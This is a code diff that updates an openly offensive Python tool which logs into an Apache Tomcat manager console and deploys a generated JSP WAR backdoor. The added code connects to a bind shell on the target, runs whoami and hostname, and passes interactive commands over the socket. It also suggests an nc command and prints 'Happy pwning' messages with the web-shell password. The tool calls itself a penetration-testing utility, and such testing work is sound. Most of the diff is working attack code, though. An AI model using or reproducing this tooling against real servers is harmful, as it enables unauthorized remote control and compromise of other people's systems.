@@ -7,7 +7,7 @@
 #   in order to upload there an automatically generated WAR application.
 #   After having the application uploaded and deployed, script invokes it
 #   and then if configured so - handles incoming shell connection (reverse tcp)
-#   or connects back to binded connection.
+#   or connects back to binded shell socket.
 #
 # In other words - automatic Tomcat WAR deployment pwning tool.
 #
@@ -24,25 +24,37 @@
 # Mariusz B. / MGeeky, '16
 #
 
-import mechanize
+import re
 import os
-import urllib
-import time
-import urllib2
 import sys
+import time
 import random
 import string
-import optparse
-import tempfile
 import shutil
-import re
 import base64
+import socket
+import urllib
+import urllib2
 import logging
 import commands
+import optparse
+import tempfile
+import mechanize
+import threading
+import subprocess
 from BeautifulSoup import BeautifulSoup
 
-VERSION='0.3'
 
+VERSION = '0.3'
+
+RECVSIZE = 8192
+
+SHELLEVENT = threading.Event()  
+SHELLSTATUS = threading.Event()  
+SHELLTHREADQUIT = False
+
+
+# Logger configuration
 logging.basicConfig(format='%(levelname)s: %(message)s', level=logging.INFO)
 logging.addLevelName( logging.DEBUG, "\033[1;32m%s\033[1;0m" % logging.getLevelName(logging.DEBUG))
 logging.addLevelName( logging.WARNING, "\033[1;35m%s\033[1;0m" % logging.getLevelName(logging.WARNING))
@@ -50,13 +62,93 @@ logging.addLevelName( logging.ERROR, "\033[1;41m%s\033[1;0m" % logging.getLevelN
 logger = logging.getLogger()
 
 
+def shellHandler(mode, host, opts):
+    logger.debug('Spawned shell handling thread. Awaiting for the event...')
+    SHELLEVENT.wait()
+    time.sleep(int(opts.timeout) / 10)
+
+    if mode == 1:
+        # if Reverse TCP - firstly establish listener, then invoke application.
+        establishReverseTcpListener(opts)
+
+    if mode == 2:
+        # If Bind TCP - firstly invoke application, then connect back to it.
+        connectToBindShell(host, opts)
+    
+
 def establishReverseTcpListener(opts):
     logger.debug('Establishing listener for incoming reverse TCP shell...')
 
 def connectToBindShell(hostn, opts):
-    host = hostn[:hostn.find(':')]
-    logger.debug('Shell has binded to port %s at remote host. Connecting back to it...' % opts.port)
-    
+    portpos = hostn.find(':')
+    host = hostn[:portpos]
+    if '/' in host:
+        host = host[host.find('/')+1:host.rfind('/')]
+
+    logger.debug('Shell is to be binded to %s:%s. Connecting back to it...' % (host, opts.port))
+
+    sock = None
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(int(opts.timeout))
+    except socket.error, e:
+        logger.error("Creating socket for bind-shell client failed: '%s'" % e)
+        return False
+
+    retries = 3
+    status = False
+    for retry in range(retries):
+        try:
+            sock.connect((host, int(opts.port)))
+            status = True
+            break
+        except (socket.gaierror, socket.error) as e:
+            logger.warning("Retry %d/%d: Connecting to the bind-shell failed.\n\tError: '%s'" % ((retry+1), retries, e))
+            time.sleep(1)
+
+    if not status:
+        logger.error('Connection failed. Quitting due to inability to connect back to bind shell.')
+        return False
+
+    try:
+        sock.send('whoami\n')
+        whoami = sock.recv(RECVSIZE).strip()
+        sock.send('hostname\n')
+        hostname = sock.recv(RECVSIZE).strip()
+    except (socket.gaierror, socket.error) as e:
+        logger.error("Initial commands could not be executed. Something is wrong.\n\tError: '%s'" % e)
+        return False
+
+    logger.debug('Connected with the bind-shell: %s@%s' % (whoami, hostname))
+    sock.settimeout(0)
+    sock.setblocking(1)
+    SHELLSTATUS.set()
+
+    try:
+        while True:
+            command = raw_input("\n%s@%s $ " % (whoami, hostname))
+            if not command: continue
+            if command.lower() == 'exit' or command.lower() == 'quit':
+                sock.close()
+                break
+
+            sock.send(command + '\n')
+            res = sock.recv(RECVSIZE).strip()
+
+            if not len(res) and len(command):
+                sock.close()
+                break
+
+            print res
+
+    except KeyboardInterrupt:
+        sock.shutdown(0)
+        SHELLSTATUS.clear()
+        # Pass it down to the main function's except block.
+        raise KeyboardInterrupt
+
+    SHELLSTATUS.clear()
+
 
 def generateWAR(code, title, appname):
     dirpath = tempfile.mkdtemp()
@@ -320,13 +412,18 @@ def invokeApplication(browser, url, opts):
             logger.debug("Adding 'X-Pass: %s' header for shell functionality authentication." % opts.shellpass)
             browser.addheaders.append(('X-Pass', opts.shellpass))
 
-        if mode == 1 and opts.noconnect:
-            logger.warning("Set up your incoming shell listener, I'm giving you 3 seconds.")
-            time.sleep(3)
-        elif mode == 0 and opts.noconnect:
-            logger.warning("Connect back to your shell at: %s:%s" % (url[:url.find(':')], opts.port))
-        elif mode == 2 and opts.noconnect:
-            logger.warning("Shell has been binded. Go and connect back to it!")
+        if opts.noconnect:
+            if mode == 0:
+                logger.warning("Connect back to your shell at: %s:%s" % (url[:url.find(':')], opts.port))
+            elif mode == 1:
+                logger.warning("Set up your incoming shell listener, I'm giving you %d seconds." % (int(opts.timeout) / 2))
+                time.sleep(int(opts.timeout) / 2)
+            elif mode == 2:
+                logger.warning("Shell has been binded. Go and connect back to it!")
+                logger.warning("How about: \t$ nc %s %s" % (url[:url.find(':')], opts.port))
+        else:
+            SHELLEVENT.set()
+
         resp = browser.open(appurl)
         return True
 
@@ -480,15 +577,16 @@ Penetration Testing utility aiming at presenting danger of leaving Tomcat miscon
     conn.add_option('-H', '--host', metavar='RHOST', dest='host', help='Remote host for reverse tcp payload connection. When specified, RPORT must be specified too. Otherwise, bind tcp payload will be deployed listening on 0.0.0.0')
     conn.add_option('-p', '--port', metavar='PORT', dest='port', help='Remote port for the reverse tcp payload when used with RHOST or Local port if no RHOST specified thus acting as a Bind shell endpoint.')
     conn.add_option('-u', '--url', metavar='URL', dest='url', default='/manager/', help='Apache Tomcat management console URL. Default: /manager/')
+    conn.add_option('-t', '--timeout', metavar='TIMEOUT', dest='timeout', default='10', help='Speciifed timeout parameter for socket object and other timing holdups. Default: 10')
     parser.add_option_group(conn)
 
     payload = optparse.OptionGroup(parser, 'Payload options')
     payload.add_option('-R', '--remove', metavar='APPNAME', dest='remove_appname', help='Remove deployed app with specified name. Can be used for post-assessment cleaning')
     payload.add_option('-X', '--shellpass', metavar='PASSWORD', dest='shellpass', help='Specifies authentication password for uploaded shell, to prevent unauthenticated usage. Default: randomly generated. Specify "None" to leave the shell unauthenticated.', default=generateRandomPassword())
-    payload.add_option('-t', '--title', metavar='TITLE', dest='title', help='Specifies head>title for uploaded JSP WAR payload. Default: "JSP Application"', default='JSP Application')
+    payload.add_option('-T', '--title', metavar='TITLE', dest='title', help='Specifies head>title for uploaded JSP WAR payload. Default: "JSP Application"', default='JSP Application')
     payload.add_option('-n', '--name', metavar='APPNAME', dest='appname', help='Specifies JSP application name. Default: "jsp_app"', default='jsp_app')
-    payload.add_option('-x', '--unload', dest='unload', help='Unload existing JSP Application with the same name. Default: no.', action='store_true')
-    payload.add_option('-C', '--noconnect', dest='noconnect', help='Do not connect to the spawned shell immediately. By default this program will connect to the spawned shell, specifying this option let\'s you use other handlers like Metasploit, NetCat and so on.', action='store_true')
+    payload.add_option('-x', '--unload', dest='unload', help='Unload existing JSP Application with the same name. Default: no.', action='store_true', default=False)
+    payload.add_option('-C', '--noconnect', dest='noconnect', help='Do not connect to the spawned shell immediately. By default this program will connect to the spawned shell, specifying this option let\'s you use other handlers like Metasploit, NetCat and so on.', action='store_true', default=False)
     payload.add_option('-f', '--file', metavar='WARFILE', dest='file', help='Custom WAR file to deploy. By default the script will generate own WAR file on-the-fly.')
     parser.add_option_group(payload)
 
@@ -542,7 +640,12 @@ def main():
 
     if not opts.generate:
         url = 'http://%s%s' % (args[0], opts.url)
-        browser, url = browseToManager(url, opts.user, opts.password)
+        try:
+            browser, url = browseToManager(url, opts.user, opts.password)
+        except KeyboardInterrupt:
+            logger.info("User has interrupted while browsing to Apache Manager.")
+            return
+
         if browser == None:
             return
 
@@ -613,26 +716,32 @@ def main():
         if deployed:
             logger.debug('Succeeded, invoking it...')
 
-            if mode == 1 and not opts.noconnect:
-                # if Reverse TCP - firstly establish listener, then invoke application.
-                establishReverseTcpListener(opts)
+            thread = None
+            if not opts.noconnect and (mode == 1 or mode == 2):
+                thread = threading.Thread(target=shellHandler, args = (mode, args[0], opts))
+                thread.daemon = True
+                thread.start()
 
             if invokeApplication(browser, args[0], opts):
                 logger.info("\033[0;32mJSP Backdoor up & running on http://%s/%s/\033[1;0m" % (args[0], opts.appname))
                 if opts.shellpass.lower() != 'none':
-                    logger.info("\033[0;33mHappy pwning, here take that password for web shell: '%s'\033[1;0m" % opts.shellpass)
+                    logger.info("\033[0;33mHappy pwning. Here take that password for web shell: '%s'\033[1;0m" % opts.shellpass)
                 else:
                     logger.warning("\033[0;33mHappy pwning, you've not specified shell password (caution with that!)\033[1;0m")
-
-                if mode == 2 and not opts.noconnect:
-                    # If Bind TCP - firstly invoke application, then connect back to it.
-                    connectToBindShell(args[0], opts)
 
                 if mode == 0:
                     logger.debug('No shell functionality was included in backdoor.')
             else:
-                logger.error("\033[1;41mNo pwning today, backdoor was not deployed.\033[1;0m")
+                logger.error("\033[1;41mSorry, no pwning today. Backdoor was not deployed.\033[1;0m")
 
+            if thread != None:
+                if not SHELLSTATUS.wait(int(opts.timeout)):
+                    logger.warning('Awaiting for shell handler to bind has timed-out.')
+                    logger.warning('Assuming failure, thereof quitting. Sorry about that...')
+                    SHELLTHREADQUIT = True
+                else:
+                    while SHELLSTATUS.is_set():
+                        pass
 
         else:
             logger.error('Failed.')
